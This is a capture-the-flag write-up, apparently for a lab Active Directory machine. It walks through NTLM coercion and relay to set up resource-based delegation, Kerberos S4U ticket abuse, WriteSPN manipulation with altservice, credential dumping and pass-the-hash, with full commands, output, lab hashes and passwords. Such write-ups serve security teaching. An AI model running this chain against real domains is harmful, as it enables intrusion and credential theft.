
```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ nmap -A -T5 192.168.100.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-15 07:46 UTC
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 40.53% done; ETC: 07:47 (0:00:13 remaining)
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.87% done; ETC: 07:47 (0:00:00 remaining)
Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.86% done; ETC: 07:47 (0:00:00 remaining)
Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.86% done; ETC: 07:47 (0:00:00 remaining)
Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.86% done; ETC: 07:47 (0:00:00 remaining)
Nmap scan report for 192.168.100.2
Host is up (0.042s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Timing level 5 (Insane) used
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-15T14:47:08
|_  start_date: N/A
|_clock-skew: 6h59m52s

TRACEROUTE
HOP RTT      ADDRESS
1   42.31 ms 192.168.100.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.31 seconds
```

The scan revealed a Windows-based system exposing several services, including **HTTP (80/TCP)**, **RPC (135/TCP)**, **NetBIOS (139/TCP)**, **SMB (445/TCP)**, and **WinRM (5985/TCP)**. The web service is hosted on **Microsoft IIS 10.0**, while WinRM is available for remote administration. These services closely resemble those commonly found on an application or web server rather than a Domain Controller.

A particularly interesting observation is that the host exposes IIS on port 80 and resides exclusively within the internal network segment. During earlier BloodHound enumeration, a computer account named **WEB01** was identified in the domain. Given the naming convention, the presence of IIS, and the host's location within the isolated subnet, it is reasonable to hypothesize that **192.168.100.2** corresponds to `WEB01.pirate.htb`.

We will add an entry to the `/etc/hosts` file to ensure proper name resolution for the newly discovered host.

```text
192.168.100.2    WEB01.pirate.htb
```

## Abusing NTLM Relay to Configure Resource-Based Constrained Delegation

To identify potential relay opportunities, both **DC01** and **WEB01** were assessed using NetExec's **ntlm\_reflection** and **coerce\_plus** modules. The results revealed that multiple coercion techniques, including **PetitPotam**, **PrinterBug**, and **MSEven**, are available within the environment, allowing NTLM authentication to be forcibly triggered from targeted systems.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ nxc smb DC01.pirate.htb -u 'gMSA_ADFS_prod$' -H '8e142bbd224b307f3cb31752b29f4893' -M ntlm_reflection -M coerce_plus
SMB         10.129.6.9   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.6.9   445    DC01             [+] pirate.htb\gMSA_ADFS_prod$:8e142bbd224b307f3cb31752b29f4893
COERCE_PLUS 10.129.6.9   445    DC01             VULNERABLE, DFSCoerce
COERCE_PLUS 10.129.6.9   445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 10.129.6.9   445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 10.129.6.9   445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 10.129.6.9   445    DC01             VULNERABLE, MSEven

┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ nxc smb WEB01.pirate.htb -u 'gMSA_ADFS_prod$' -H '8e142bbd224b307f3cb31752b29f4893' -M ntlm_reflection -M coerce_plus
SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
SMB         192.168.100.2   445    WEB01            [+] pirate.htb\gMSA_ADFS_prod$:8e142bbd224b307f3cb31752b29f4893
COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, PetitPotam
COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, PrinterBug
COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, PrinterBug
COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, MSEven
```

A key distinction between the two hosts lies in their SMB signing configuration. **DC01** has SMB signing enabled and enforced, which prevents NTLM-to-SMB relay attacks by ensuring the integrity of SMB authentication sessions. However, this protection does not prevent NTLM authentication from being relayed to other services such as LDAP.

In contrast, **WEB01** does not enforce SMB signing, making it a suitable target for NTLM relay attacks. As a result, an attacker can coerce **WEB01** to authenticate and then relay the captured NTLM authentication to the LDAP service running on **DC01**. This creates a viable attack path that leverages the weaker SMB security configuration on WEB01 to target Active Directory services on the Domain Controller.

Having identified a viable NTLM relay path, the next step is to exploit the misconfiguration. For this phase, the latest version of **Impacket** is recommended, as newer releases include improved support for modern relay techniques and Active Directory abuse primitives.

The attack begins by launching `impacket-ntlmrelayx`, configured to relay incoming NTLM authentications to the **LDAPS** service on **DC01**. The tool is instructed to perform **Resource-Based Constrained Delegation (RBCD)** abuse by granting delegation rights to the previously compromised machine account **MS01$**. Once started, ntlmrelayx listens for inbound authentication attempts over SMB, HTTP, and other supported protocols while waiting for a coerced connection.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ impacket-ntlmrelayx -t ldaps://10.129.6.9 --delegate-access --escalate-user 'MS01$' -smb2support --remove-mic  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

With the relay listener active, `Coercer` was used to force **WEB01** to authenticate to the attacker's machine. The tool systematically tested several coercion primitives, including **PrinterBug**, **MS-EVEN**, and **EFSRPC (PetitPotam-related)** techniques, all of which attempt to trigger outbound NTLM authentication from the target.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ coercer coerce -u 'gMSA_ADCS_prod$' --hashes ':8e142bbd224b307f3cb31752b29f4893' -d pirate.htb -l 10.10.14.52 -t 192.168.100.2 --always-continue       
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target 192.168.100.2
[*] DCERPC portmapper discovered ports: 49664,49665,49667,49708,49709,49688,49692
[+] DCERPC port '49688' is accessible!
   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
      [>] (-testing-) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\10.10.14      [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\10.10.14.52\x00') 
      [>] (-testing-) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\10.10.      [!] (RPC_S_INVALID_NET_ADDR) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\10.10.14.52\x00') 
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\10.10.14.52\rg1ec9hc\aa') 
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.14.52\OTrnuxys\file.txt\x00') 
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.14.52\n20BMvOv\\x00') 
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.14.52\723kP6o5\x00') 
      [>] (-testing-) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.14.52@80/aNv\share\file.txt\x00'      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.14.52@80/aNv\share\file.txt\x00')
```

Multiple requests generated responses such as `ERROR_BAD_NETPATH` and `NO_AUTH_RECEIVED`, which are commonly observed when coercion attempts successfully cause the target to reach out to the specified listener. Since ntlmrelayx was already waiting for inbound connections, any resulting NTLM authentication could then be relayed directly to **LDAPS on DC01**.

**Note on Coercer Output**

During NTLM coercion attacks, error messages such as `ERROR_BAD_NETPATH`, `NO_AUTH_RECEIVED`, and `RPC_S_INVALID_NET_ADDR` are often expected and do not necessarily indicate failure. The objective of coercion is not to successfully complete the RPC operation itself, but rather to force the target machine to initiate an outbound authentication request to an attacker-controlled host.

When a coercion primitive references a UNC path such as `\\10.10.14.52\share`, the target attempts to access the remote resource and performs NTLM authentication as part of the connection process. Even if the share does not exist or the connection subsequently fails, the authentication attempt may already have been transmitted to the attacker's listener.

## Impersonating Administrator on WEB01 via Kerberos Delegation

After successfully configuring **Resource-Based Constrained Delegation (RBCD)** through the NTLM relay attack, the compromised **MS01$** machine account can be leveraged to impersonate privileged users when accessing services on **WEB01**.

The first step is to obtain a Kerberos Ticket Granting Ticket (TGT) for **MS01$**. This ticket serves as the authentication foundation required for the subsequent delegation abuse. Once acquired, the Kerberos credential cache is exported so that Impacket tools can automatically utilize the ticket for Kerberos-authenticated operations.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ impacket-getTGT pirate.htb/'MS01$':'ms01' -dc-ip 10.129.6.9
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in MS01$.ccache

┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ export KRB5CCNAME=MS01\$.ccache
```

With a valid TGT loaded, `getST` is used to perform an **S4U (Service for User)** attack. Specifically, **MS01$** requests a service ticket to the **CIFS** service running on **WEB01** while impersonating the **Administrator** account. Because RBCD has already been configured, the Domain Controller honors the request and issues a service ticket on behalf of the privileged user.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ impacket-getST pirate.htb/'MS01$' -spn 'cifs/WEB01.pirate.htb' -impersonate Administrator -dc-ip 10.129.6.9 -k -no-pass                                                                  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

This effectively grants access to the target service as **Administrator** without requiring the administrator's password or NTLM hash. The resulting Kerberos service ticket can then be used to authenticate to WEB01 and perform privileged actions.

Before leveraging the newly obtained service ticket, the Kerberos credential cache must be updated to use the ticket generated by **getST**. This is accomplished by setting the `KRB5CCNAME` environment variable to the newly created cache file containing the impersonated **Administrator** service ticket for **WEB01**.

```shell
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

To capitalize on this access, `impacket-secretsdump` was executed using Kerberos authentication against **WEB01**. This allowed extraction of sensitive credential material from the target system, including local account hashes and stored credentials.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ impacket-secretsdump -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

....
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
....
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu
```

The credential dump revealed a valuable finding within the **LSA Secrets**. Among the recovered secrets was a **DefaultPassword** entry containing a plaintext domain credential:

```text
PIRATE\a.white : E2nvAOKSz5Xz2MJu
```

Such entries are commonly associated with Windows auto-logon configurations, where credentials are stored locally to enable automatic user authentication after system startup. The presence of plaintext credentials significantly reduces the effort required to compromise additional accounts within the environment.

In addition to the plaintext password, the dump also provided the NTLM hash of the local **Administrator** account. Using this hash, remote administrative access to **WEB01** was established via `evil-WinRM`, providing an interactive PowerShell session with elevated privileges on the target host.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ evil-winrm -i 192.168.100.2 -u 'Administrator' -H 'b1aac1584c2ea8ed0a9429684e4fc3e5'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

After obtaining administrative access to WEB01, the filesystem was examined for user-specific artifacts. Navigating to **a.white's** desktop revealed the user flag, confirming successful compromise of the target user account and completion of the user-level objective.

## Escalating Through a.white and a.white\_adm

After obtaining the credentials of **a.white**, BloodHound was executed again to identify additional privilege escalation opportunities. The updated graph revealed a critical attack path involving **a.white\_adm**.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F3dl0xco6sX2rg1Ng3v3u%252FScreenshot%2520%282919%29.png%3Falt%3Dmedia%26token%3D5ff60f20-acd5-4ea1-902a-d49218f27ec0&width=768&dpr=3&quality=100&sign=b5df03c1&sv=2)

Analysis showed that **a.white\_adm** is associated with the **IT** group, which possesses **WriteSPN** privileges over several computer accounts, including **DC01**, **MS01**, and **EXCH01**. The ability to modify Service Principal Names (SPNs) on these systems is highly sensitive, as it can be abused to manipulate Kerberos authentication and create new attack paths toward domain compromise.

Notably, **a.white** has a corresponding administrative account named **a.white\_adm**. Earlier BloodHound enumeration revealed that **a.white** possesses password reset privileges over this account. Therefore, having already compromised **a.white**, we can directly take control of **a.white\_adm** by resetting its password to a known value.

## Abusing WriteSPN to Manipulate Kerberos Service Resolution

To gain control of the administrative account, the password reset privileges of **a.white** were abused using `BloodyAD`. A new password was assigned to **a.white\_adm**, providing full access to the account and unlocking the privileges associated with the **IT** group.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ bloodyad -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' -d pirate.htb --host 10.129.6.9 set password 'a.white_adm' 'Password1234!'
[+] Password changed successfully!
```

This step is particularly important because it grants access to the **WriteSPN** permissions identified in BloodHound, which will be leveraged in the next phase of the attack.

## Understanding WriteSPN

The **servicePrincipalName (SPN)** attribute tells Active Directory which services a computer or account is responsible for. Kerberos uses these SPNs when issuing service tickets to clients.

The **WriteSPN** permission allows an account to add, remove, or modify SPNs on another object. While this may appear harmless, it can have serious security implications because Kerberos trusts these SPN registrations when generating service tickets.

In our case, the **IT** group has **WriteSPN** privileges over several computer accounts, including **DC01**. Since **a.white\_adm** is a member of this group, controlling the account effectively gives us the ability to modify SPNs on these systems.

By moving or creating specific SPNs, we can manipulate how Kerberos resolves service requests. This allows us to abuse **S4U2Proxy** delegation to obtain service tickets for privileged users, such as **Administrator**, and then redirect those tickets to services of our choosing.

In simple terms, **WriteSPN** gives us control over Kerberos service identities. When combined with delegation features, this can be abused to impersonate privileged users and access systems that would normally be restricted.

After obtaining control of **a.white\_adm** and its delegated `WriteSPN` privileges, the next step was to inspect the Service Principal Names currently registered on **WEB01$**. This allows us to identify existing Kerberos service mappings before making any modifications.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ addspn -u 'pirate.htb\a.white_adm' -p 'Password1234!' -t 'WEB01$' -q 10.129.6.9
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
DN: CN=WEB01,CN=Computers,DC=pirate,DC=htb - STATUS: Read - READ TIME: 2026-07-15T08:28:49.756978
    dNSHostName: WEB01.pirate.htb
    sAMAccountName: WEB01$
    servicePrincipalName: tapinego/WEB01
                          tapinego/WEB01.pirate.htb
                          WSMAN/WEB01
                          WSMAN/WEB01.pirate.htb
                          HOST/WEB01.pirate.htb
                          RestrictedKrbHost/WEB01.pirate.htb
                          HOST/WEB01
                          RestrictedKrbHost/WEB01
                          TERMSRV/WEB01.pirate.htb
                          TERMSRV/WEB01
                          HTTP/WEB01
                          HTTP/WEB01.pirate.htb
```

The enumeration revealed several SPNs associated with WEB01, including services related to **HTTP**, **WinRM (WSMAN)**, **Terminal Services**, and standard host-based Kerberos authentication. Of particular interest is the **HTTP/WEB01** SPN, which will be leveraged in the subsequent Kerberos delegation attack.

To prepare for SPN manipulation, the **HTTP/WEB01** Service Principal Name was removed from the **WEB01$** computer account. Since SPNs must be unique within the domain, removing the existing registration makes the service name available for reassignment elsewhere.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ addspn -u 'pirate.htb\a.white_adm' -p 'Password1234!' -t 'WEB01$' -s 'HTTP/WEB01' -r 10.129.6.9                                                                                                               
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

This step is essential because our objective is to relocate the SPN to a different computer account that we wish to target.

With the SPN removed from WEB01, it was subsequently added to the **DC01$** computer account. As a result, Kerberos now associates requests for **HTTP/WEB01** with the Domain Controller rather than the original web server.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ addspn -u 'pirate.htb\a.white_adm' -p 'Password1234!' -t 'DC01$' -s 'HTTP/WEB01' 10.129.6.9
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

This is where the **WriteSPN** permission becomes powerful. By controlling SPN assignments, we can influence how Kerberos resolves service identities and create conditions that are favorable for delegation abuse.

## Forging Administrator Service Tickets Through S4U2Proxy Abuse

After the SPN reassignment was completed, Kerberos delegation was abused using `impacket-getST`. The attack begins by requesting a service ticket for **HTTP/WEB01** while impersonating the **Administrator** account. Because the SPN now points to **DC01**, Kerberos processes the delegation request using the Domain Controller's identity.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ impacket-getST -spn 'HTTP/WEB01.pirate.htb' -impersonate 'Administrator' pirate.htb/a.white_adm:'Password1234!' -dc-ip 10.129.6.9 -altservice 'CIFS/DC01.pirate.htb'                                          
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

The `-altservice` option is then used to modify the resulting ticket so that it targets the **CIFS** service on **DC01**. Although the ticket was originally issued through the **HTTP/WEB01** SPN, the Kerberos Key Distribution Center (KDC) considers the delegation chain valid and signs the resulting service ticket accordingly.

The final result is a Kerberos service ticket that grants access to **CIFS/DC01** under the security context of **Administrator**, effectively providing privileged access to the Domain Controller without possessing the Administrator password.

## Why This Works

The **WriteSPN** permission allows us to control which machine account owns a particular Kerberos service. By moving **HTTP/WEB01** from **WEB01$** to **DC01$**, Kerberos ultimately treats requests for that service as belonging to the Domain Controller. When combined with **S4U2Proxy** delegation and the **altservice** feature, this enables us to obtain a valid service ticket for **Administrator** and redirect it to **CIFS/DC01**, resulting in privileged access to the Domain Controller.

## Achieving Domain Administrator Access

Following the successful Kerberos delegation attack, a service ticket granting **Administrator** access to the Domain Controller's **CIFS** service was obtained. Before using this ticket, the active Kerberos cache was updated so that subsequent tools would authenticate using the newly forged credential.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache 
```

With the Administrator service ticket loaded, privileged operations could now be performed directly against **DC01** without requiring the Administrator password.

To fully compromise the Domain Controller, `impacket-secretsdump` was executed using Kerberos authentication. Since the current ticket grants Administrator-level access to DC01, the tool was able to perform a DCSync-style operation and retrieve credential data directly from Active Directory.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ impacket-secretsdump -k -no-pass DC01.pirate.htb -dc-ip 10.129.6.9 -target-ip 10.129.6.9 -just-dc-user Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

....
Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
....
```

After recovering the Administrator NTLM hash, a Pass-the-Hash attack was performed using `Evil-WinRM` to establish a remote PowerShell session on the Domain Controller.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Pirate]
└─$ evil-winrm -i dc01.pirate.htb -u Administrator -H '598295e78bd72d66f837997baf715171'                             
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
pirate\administrator
```

Authentication succeeded immediately, confirming that the extracted hash was valid and that full Domain Administrator privileges had been obtained.

With Domain Administrator privileges established, the final objective was completed by accessing the Administrator desktop and retrieving the root flag. Successfully obtaining the flag confirms full compromise of the target environment and concludes the attack chain.

## Conclusion

This machine demonstrated how seemingly low-privileged access can escalate into a complete Active Directory compromise through the abuse of legacy permissions, delegation mechanisms, and Kerberos trust relationships. Starting with the provided **pentest** credentials, we performed comprehensive enumeration using SMB, LDAP, Kerberos, and BloodHound to identify potential attack paths. The key finding was the presence of **Pre-Windows 2000 Compatible Access**, which allowed us to abuse pre-created computer accounts and obtain control of **MS01$**. From there, delegated permissions enabled the extraction of **gMSA** credentials, granting remote access to the Domain Controller and revealing an internal network segment that required pivoting through `Ligolo-ng`.

After discovering **WEB01** within the internal network, we leveraged **NTLM relay** and **Resource-Based Constrained Delegation (RBCD)** to impersonate **Administrator** and gain privileged access to the server. This led to the recovery of **a.white's** credentials, which were then used to compromise **a.white\_adm** and abuse its **WriteSPN** privileges. By manipulating Service Principal Names and exploiting **S4U2Proxy** delegation with **altservice**, we forged a valid Administrator service ticket for **DC01**, ultimately extracting the Domain Administrator hash and obtaining full control of the domain. Overall, Pirate highlights the security risks posed by legacy Active Directory configurations, excessive delegated permissions, and improper Kerberos delegation settings, demonstrating how multiple small weaknesses can be chained together to achieve complete domain compromise.
